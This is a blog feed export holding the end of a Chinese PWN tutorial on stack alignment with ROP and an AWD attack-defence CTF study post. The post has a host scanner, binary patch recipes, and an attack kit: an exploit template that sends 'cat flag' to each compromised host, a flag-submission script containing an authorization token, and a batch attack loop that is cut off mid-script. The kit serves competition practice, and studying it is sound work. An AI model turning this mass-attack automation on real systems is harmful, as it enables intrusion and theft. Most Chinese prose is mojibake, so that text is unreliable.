å°±æ˜¾è€Œæ˜“è§äº†ï¼šå½“å†…å­˜åœ°å€ä½œä¸ºæ“ä½œæ•°æ—¶ï¼Œå†…å­˜åœ°å€å¿…é¡»å¯¹é½ <strong>16Byte</strong> ã€ <strong>32Byte</strong> æˆ– <strong>64Byte</strong> ã€‚è¿™é‡Œæ‰€è¯´çš„å¯¹é½ <strong>xByte</strong>ï¼Œå°±æ˜¯æŒ‡åœ°å€å¿…é¡»æ˜¯ <strong>x</strong> çš„å€æ•°ã€‚</p><p>è¿™æ—¶åˆå‡ºç°äº†ä¸€ä¸ªé—®é¢˜ï¼šåˆ°åº•æ˜¯å¯¹é½å¤šå°‘å­—èŠ‚å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™æ ·ä¸€æ®µæè¿°ï¼š</p><blockquote><p>This instruction can be used to load an XMM, YMM or ZMM register from an 128-bit, 256-bit or 512-bit memory location, to store the contents of an XMM, YMM or ZMM register into a 128-bit, 256-bit or 512-bit memory location, or to move data between two XMM, two YMM or two ZMM registers.</p></blockquote><p>åŸºäºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ¨æµ‹ï¼šä½¿ç”¨ <strong>XMM</strong> æ—¶ï¼Œéœ€è¦ <strong>16Byte</strong> å¯¹é½ï¼›ä½¿ç”¨ <strong>YMM</strong> æ—¶ï¼Œéœ€è¦ <strong>32Byte</strong> å¯¹é½ï¼›ä½¿ç”¨ <strong>ZMM</strong> æ—¶ï¼Œéœ€è¦ <strong>64Byte</strong> å¯¹é½ã€‚</p><p>è€Œæ­¤å¤„å‡ºé”™çš„æŒ‡ä»¤ä½¿ç”¨äº† <strong>XMM</strong> å¯„å­˜å™¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç¡®ä¿åœ¨æ‰§è¡Œè¿™ä¸€æŒ‡ä»¤æ—¶ï¼Œ<strong>rsp + 0x50</strong> æ˜¯ <strong>16</strong> çš„å€æ•°ã€‚ç›´è§‚åœ°è¯´ï¼Œå°±æ˜¯è¯¥åœ°å€å¿…é¡»ä»¥æ•°å­— <strong>0</strong> ç»“å°¾ã€‚</p><p>åŸºäºä¸Šé¢çš„åˆ†æï¼Œè§£å†³æ–¹æ¡ˆå·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ï¼šæˆ‘ä»¬éœ€è¦ä¿®æ”¹æ ˆçš„ç»“æ„ï¼Œä½¿å¾—ç¨‹åºæ‰§è¡Œåˆ°å‡ºé”™æŒ‡ä»¤æ—¶ï¼Œ <strong>rsp + 0x50</strong> æ˜¯16çš„æ•´æ•°å€ã€‚è¿™æ—¶ä¾¿å‡ºç°äº†ä¸¤ä¸ªéå¸¸å…·ä½“çš„é—®é¢˜ï¼š</p><ol><li>æˆ‘ä»¬è¯¥å¦‚ä½•ç¡®ä¿èƒ½è·å¾—shellçš„å‰æä¸‹ä¿®æ”¹æ ˆçš„ç»“æ„ï¼Ÿ</li><li>æˆ‘ä»¬è¯¥å°†æ ˆçš„ç»“æ„ä¿®æ”¹æˆä»€ä¹ˆæ ·å­ï¼Ÿ</li></ol><p>ç¬¬1ä¸ªé—®é¢˜å¾ˆå¥½å›ç­”â€”â€”æˆ‘ä»¬å¯ä»¥å€ŸåŠ©<a href="https://zhida.zhihu.com/search?content_id=224123051&amp;content_type=Article&amp;match_order=1&amp;q=ROP&amp;zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDMwOTMyMTAsInEiOiJST1AiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyMjQxMjMwNTEsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.L8JVxrrpFrSd3Q7y61JPlIZ6daxfKzmfw6aiQeBPI4I&amp;zhida_source=entity">ROP</a>çš„æ€æƒ³ï¼Œå†æ ˆä¸­æ·»åŠ è‹¥å¹²æ±‡ç¼–ç‰‡æ®µï¼Œä»¥ç¡®ä¿åœ¨èƒ½è·å¾—shellçš„å‰æä¸‹ä¿®æ”¹æ ˆçš„ç»“æ„ã€‚</p><p>æ¥ä¸‹æ¥å›ç­”ç¬¬äºŒä¸ªé—®é¢˜ï¼šæˆ‘ä»¬éœ€è¦å°†æ ˆä¿®æ”¹æˆä»€ä¹ˆæ ·å­ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œç”±äºç¨‹åºçš„ä»£ç æ˜¯ä¸å˜çš„ï¼Œå› æ­¤ç¨‹åºä»è¿›å…¥ <strong>vulnerable_function</strong> åˆ°æ‰§è¡Œåˆ°å‡ºé”™æŒ‡ä»¤è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæ ˆé¡¶ <strong>rsp</strong> çš„å˜åŒ–é‡æ˜¯ä¸å˜çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è¿›å…¥ <strong>vulnerable_function</strong> å‰çš„æ ˆç»“æ„ï¼Œè¿›è€Œå½±å“æ‰§è¡Œå‡ºé”™æŒ‡ä»¤å‰çš„æ ˆç»“æ„ã€‚</p><p>é‚£è¿™ä¸ªå˜åŒ–é‡å…·ä½“æ˜¯å¤šå°‘å‘¢ï¼Ÿé€šè¿‡GBDè°ƒè¯•å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿›å…¥ <strong>vulnerable_function</strong> å‰ï¼Œ<strong>rsp</strong> ä¸­çš„å€¼æ˜¯ <strong>0x7fffffffdf38</strong> ï¼›è€Œæ‰§è¡Œå‡ºé”™æŒ‡ä»¤å‰ï¼Œ<strong>rsp</strong> ä¸­çš„å€¼æ˜¯ <strong>0x7fffffffdba8</strong> ã€‚å› æ­¤ï¼Œä»è¿›å…¥ <strong>vulnerable_function</strong> åˆ°æ‰§è¡Œåˆ°å‡ºé”™æŒ‡ä»¤ï¼Œæ ˆé¡¶çš„å€¼å‡å°äº† <strong>0x390</strong> ã€‚</p><p>ä¸ºæ–¹ä¾¿è¡¨è¿°ï¼Œè®°è¿›å…¥ <strong>vulnerable_function</strong> å‰çš„æ ˆé¡¶ä¸º <strong>origin_sp</strong> ï¼Œåˆ™æœ‰ï¼š<strong>(origin_sp - 0x390 + 0x50) % 0x10 == 0</strong> ã€‚ä¹Ÿå³ <strong>origin_sp % 0x10 == 0</strong> ã€‚</p><p>åŸºäºä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ <strong>vulnerable_function</strong> çš„åœ°å€å‰å¢åŠ ä¸€ä¸ªæ–°çš„åœ°å€ï¼Œè¯¥åœ°å€æ°å¥½æŒ‡å‘ä¸€ä¸ª <strong>ret</strong> æŒ‡ä»¤ã€‚è¿™æ ·ä¸€æ¥ï¼Œç”±äºåŠ å…¥äº†ä¸€ä¸ªæ–°åœ°å€ï¼Œæ ˆé¡¶è¢«è¿«ä¸‹ç§»8ä¸ªå­—èŠ‚ï¼Œä½¿ä¹‹å¯¹é½ <strong>16Byte</strong> ï¼›åŒæ—¶ï¼Œç”±äºæ’å…¥çš„åœ°å€æŒ‡å‘äº† <strong>ret</strong> æŒ‡ä»¤ï¼Œç¨‹åºçš„ä»ç„¶å¯ä»¥é¡ºåˆ©åœ°è¿›å…¥ <strong>vulnerable_function</strong> ä¸­ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2025/02/16/PWN%E6%8A%80%E5%B7%A7-%E6%A0%88%E5%AF%B9%E9%BD%90/image-20250326003450415.png" alt="image-20250326003450415"></p><p>è‡³äºæŒ‡å‘ <strong>ret</strong> æŒ‡ä»¤çš„åœ°å€ï¼Œå¯ä»¥åœ¨IDAä¸­ä½¿ç”¨å¿«æ·é”® <strong>alt + T</strong> è¿›è¡Œæœç´¢ã€‚</p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬ç»ˆäºå¯ä»¥å†™å‡ºæ‰“é€šæœ¬åœ°ç¯å¢ƒçš„payloadäº†ï¼š</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWDå­¦ä¹ </title>
      <link href="/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/16/AWD%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h2><ul><li>æ”¹<code>init_hosts.py</code>ä¸­çš„<code>ip</code>æ ¼å¼å’Œ<code>port</code></li><li>æ”¹<code>submit_flag.py</code>ä¸­çš„æäº¤æ–¹å¼å’Œ<code>token</code></li><li>æ”¹<code>round_wait_time</code></li><li><code>patch</code></li><li>å†™<code>exp</code></li><li>æ‰¹é‡æ”»å‡»</li></ul><h2 id="æ‰«æIP"><a href="#æ‰«æIP" class="headerlink" title="æ‰«æIP"></a>æ‰«æIP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">f&#x27;http://192-168-1-<span class="subst">&#123;i&#125;</span>.awd.bugku.cn/&#x27;</span> <span class="comment">#*</span></span><br><span class="line">        response = requests.get(url, timeout=<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            li(<span class="string">&#x27;[+] &#x27;</span> + url)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hosts&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&#x27;192-168-1-<span class="subst">&#123;i&#125;</span>.awd.bugku.cn:9999\n&#x27;</span>) <span class="comment">#*</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;Not 200 OK&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        ll(<span class="string">&#x27;[-] &#x27;</span> + url)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">f&#x27;192-168-1-<span class="subst">&#123;i&#125;</span>.awd.bugku.cn:9999\n&#x27;</span>) <span class="comment">#*</span></span><br><span class="line"> </span><br><span class="line">NUM_THREADS = <span class="number">256</span></span><br><span class="line"> </span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    thread = threading.Thread(target=check_ip, args=(i,))</span><br><span class="line">    threads.append(thread)</span><br><span class="line">    thread.start()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(threads) &gt;= NUM_THREADS:</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.join()</span><br><span class="line">        threads = []</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br></pre></td></tr></table></figure><h2 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h2><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><ul><li>IDA</li><li>åŠ æ²™ç®±ï¼š<a href="https://github.com/TTY-flag/evilPatcher#/">https://github.com/TTY-flag/evilPatcher#/</a></li><li><a href="https://github.com/aftern00n/AwdPwnPatcher#/">https://github.com/aftern00n/AwdPwnPatcher#/</a></li></ul><h3 id="å·¥å…·ä½¿ç”¨"><a href="#å·¥å…·ä½¿ç”¨" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h3><ul><li><p>åŠ æ²™ç®±é€šé˜²</p><ul><li>sandboxsé‡Œæ”¹ç¦ç”¨è§„åˆ™<ul><li>python3 evil_patcher.py file_name sandboxfile</li></ul></li></ul></li><li><p>IDAçš„patchæ­¥éª¤ï¼š<code>Edit</code> -&gt;<code>Patch program</code> -&gt; <code>Apply patches to input file</code></p></li><li><p>AWDPwnPatcherä½¿ç”¨</p></li><li><code>from AwdPwnPatcher import *binary = &quot;filename&quot;awd_pwn_patcher = AwdPwnPatcher(binary)</code></li><li><code>add_patch_in_ehframe(assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_origin(start, end=0, assembly=&quot;&quot;, machine_code=[], string=&quot;&quot;)</code></li><li><code>patch_by_jmp(self, jmp_from, jmp_to=0, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_by_call(self, call_from, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>add_constant_in_ehframe(self, string)</code></li><li><code>save(self, save_path=&quot;&quot;)</code></li></ul><h3 id="å…·ä½“æ¼æ´ä¿®å¤"><a href="#å…·ä½“æ¼æ´ä¿®å¤" class="headerlink" title="å…·ä½“æ¼æ´ä¿®å¤"></a>å…·ä½“æ¼æ´ä¿®å¤</h3><h4 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h4><h5 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"></span><br><span class="line">awd_pwn_patcher.patch_fmt_by_call(address)  <span class="comment">#call printfåœ°å€</span></span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h5 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"> </span><br><span class="line">fmt_offset = awd_pwn_patcher.add_constant_in_ehframe(<span class="string">&quot;%s\\x00\\x00&quot;</span>)  <span class="comment">#æ·»åŠ %s</span></span><br><span class="line"> </span><br><span class="line">assembly = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rsi, qword ptr [rbp-0x8]</span></span><br><span class="line"><span class="string">lea rdi, qword ptr [&#123;&#125;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(fmt_offset))</span><br><span class="line"> </span><br><span class="line">awd_pwn_patcher.patch_by_jmp(<span class="number">0x706</span>, jmp_to=<span class="number">0x712</span>, assembly=assembly)    <span class="comment">#æ”¹printfï¼Œmov raxåœ°å€å’Œcall printfåœ°å€</span></span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h4 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"> </span><br><span class="line">assembly = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x20   #ç¼©å°è¾“å…¥èŒƒå›´ï¼Œæ§åˆ¶å¯„å­˜å™¨pushè¿›å»çš„å€¼</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">awd_pwn_patcher.patch_origin(<span class="number">0x8048476</span>, end=<span class="number">0x804847b</span>, assembly=assembly)   <span class="comment">#åŸpushåœ°å€å’Œpushçš„ä¸‹ä¸€æ¡åœ°å€</span></span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><h5 id="32ä½-1"><a href="#32ä½-1" class="headerlink" title="32ä½"></a>32ä½</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"> </span><br><span class="line">assembly = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add esp, 0x10</span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">mov edx, dword ptr [ebp - 0x20]</span></span><br><span class="line"><span class="string">mov eax, 0x804a060  #è¢«é‡Šæ”¾çš„åœ°å€</span></span><br><span class="line"><span class="string">lea eax, dword ptr [eax + edx*4]</span></span><br><span class="line"><span class="string">mov dword ptr [eax], 0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">awd_pwn_patcher.patch_by_jmp(<span class="number">0x80485bf</span>, jmp_to=<span class="number">0x80485c7</span>, assembly=assembly)    <span class="comment">#call freeåœ°å€å’Œä¸‹ä¸€æ¡åœ°å€</span></span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h5 id="64ä½-1"><a href="#64ä½-1" class="headerlink" title="64ä½"></a>64ä½</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> AwdPwnPatcher <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./filename&quot;</span></span><br><span class="line">awd_pwn_patcher = AwdPwnPatcher(binary)</span><br><span class="line"> </span><br><span class="line">assembly = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov eax, 0</span></span><br><span class="line"><span class="string">mov eax, dword ptr [rbp - 0x1c]</span></span><br><span class="line"><span class="string">cdqe</span></span><br><span class="line"><span class="string">lea rdx, qword ptr [0x201040]</span></span><br><span class="line"><span class="string">lea rax, qword ptr [rdx + rax*8]</span></span><br><span class="line"><span class="string">mov qword ptr [rax], 0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">awd_pwn_patcher.patch_by_jmp(<span class="number">0x838</span>, jmp_to=<span class="number">0x83d</span>, assembly=assembly)</span><br><span class="line">awd_pwn_patcher.save()</span><br></pre></td></tr></table></figure><h4 id="gets-æ ˆæº¢å‡º"><a href="#gets-æ ˆæº¢å‡º" class="headerlink" title="gets æ ˆæº¢å‡º"></a>gets æ ˆæº¢å‡º</h4><p>åªæœ‰getså‡½æ•°èƒ½å¤Ÿæ¥å—ç”¨æˆ·è¾“å…¥æ—¶ï¼Œå°†æµç¨‹åŠ«æŒåˆ°.eh_frameæ®µï¼Œåˆ©ç”¨syscallæ„é€ readå‡½æ•°ï¼Œå°±èƒ½æ§åˆ¶è¾“å…¥æ•°æ®çš„é•¿åº¦ã€‚<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.eh_frame:<span class="number">0000000000400F</span>7D mov     rax, <span class="number">0</span>          ;<span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>84 mov     rdi, <span class="number">0</span>          ; fd</span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>8B lea     rsi, [rbp+buf]  ; buf</span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>8E mov     rdx, <span class="number">90</span>h        ; count</span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>95 syscall</span><br><span class="line">.eh_frame:<span class="number">0000000000400F</span>97 jmp     loc_400AB4</span><br></pre></td></tr></table></figure></p><h4 id="è´Ÿæ•°ç»•è¿‡"><a href="#è´Ÿæ•°ç»•è¿‡" class="headerlink" title="è´Ÿæ•°ç»•è¿‡"></a>è´Ÿæ•°ç»•è¿‡</h4><p>è¾“å…¥è´Ÿæ•°-1ä¹Ÿæ»¡è¶³jleï¼Œä¿®å¤æ–¹æ³•ï¼šå°†JLEæ”¹ä¸ºJBE<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cmp     eax, <span class="number">20</span>h</span><br><span class="line">jle     <span class="type">short</span> loc_8048777</span><br></pre></td></tr></table></figure></p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># A script for awd exp</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"> </span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_flags</span>(<span class="params">d</span>):</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&#x27;./flags&#x27;</span>, <span class="string">&#x27;ab&#x27;</span>)</span><br><span class="line">    fd.write(d + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    fd.close()</span><br><span class="line"> </span><br><span class="line">ip = server_ip = sys.argv[<span class="number">1</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">r = remote(ip, port)</span><br><span class="line"> </span><br><span class="line">......<span class="comment">#exp</span></span><br><span class="line"> </span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&#123;&#x27;</span>)</span><br><span class="line">flag = <span class="string">b&#x27;viol1t&#123;&#x27;</span> + r.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">write_to_flags(flag)</span><br><span class="line"> </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="submit-flag-py"><a href="#submit-flag-py" class="headerlink" title="submit_flag.py"></a>submit_flag.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># A script for awd loop submit flag</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">flag_file = <span class="string">&#x27;./flags&#x27;</span></span><br><span class="line">threads = []</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">flag</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># url = &#x27;https://ctf.bugku.com/awd/submit.html?token=88b02ce3b420ec1f4b4a2e02dd6fe305&amp;flag=&#x27; + flag[:-1]</span></span><br><span class="line">        url = <span class="string">f&quot;curl -X POST http://27.25.152.77:19999/api/flag -H &#x27;Authorization: 7f120ca9b0e3024d06734a04a986cc55&#x27; -d &#x27;&#123;&#123; \&quot;flag\&quot;: \&quot;<span class="subst">&#123;flag[:-<span class="number">1</span>]&#125;</span>\&quot;&#125;&#125;&#x27;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="comment"># r = requests.get(url)</span></span><br><span class="line">        os.system(url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m[+] pwned!\x1b[0m&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m[-] connect fail: &#123;&#125;\x1b[0m&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(flag_file) <span class="keyword">as</span> flag_txt:</span><br><span class="line">        flags = flag_txt.readlines()</span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">            thread = threading.Thread(target=submit, args=(flag,))</span><br><span class="line">            threads.append(thread)</span><br><span class="line">            thread.start()</span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">            thread.join()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="attack-sh"><a href="#attack-sh" class="headerlink" title="attack.sh"></a>attack.sh</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"> </span><br><span class="line">attack_times=10000</span><br><span class="line">round_wait_time=30 <span class="comment">#half time</span></span><br><span class="line">wait_submit_time=5</span><br><span class="line">log_file=<span class="string">&quot;logs&quot;</span></span><br><span class="line">run_time=120 <span class="comment">#timeout</span></span><br><span class="line">next_attack_time=2.5 </span><br><span class="line">max_concurrent_attacks=10 <span class="comment"># Max number of concurrent attacks</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="title">log</span></span>()&#123;</span><br><span class="line">    t=$(<span class="built_in">date</span> <span class="string">&quot;+%H:%M:%S&quot;</span>)</span><br><span class="line">    m=<span class="string">&quot;[<span class="variable">$t</span>]<span class="variable">$1</span>&quot;</span> <span class="comment"># Fixed missing parameter usage</span></span><br><span class="line">    info=<span class="string">&quot;\033[43;37m <span class="variable">$m</span> \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$info</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$m</span>&quot;</span> &gt;&gt; <span class="variable">$log_file</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="title">attack</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;-- round <span class="variable">$1</span> -- &quot;</span> &gt;&gt; all_flags</span><br><span class="line">    <span class="built_in">cat</span> flags &gt;&gt; all_flags</span><br><span class="line">    <span class="built_in">rm</span> flags</span><br><span class="line">    <span class="built_in">local</span> <span class="built_in">jobs</span>=0</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> $(<span class="built_in">cat</span> hosts); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">timeout</span> --foreground <span class="variable">$run_time</span> python3 ./exp.py <span class="string">&quot;<span class="variable">$line</span>&quot;</span> &amp;</span><br><span class="line">        <span class="built_in">sleep</span> <span class="variable">$next_attack_time</span></span><br><span class="line">        ((jobs++))</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$jobs</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$max_concurrent_attacks</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">wait</span> <span class="comment"># Wait for all background jobs to finish</span></span><br><span class="line">            <span class="built_in">jobs</span>=0</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span 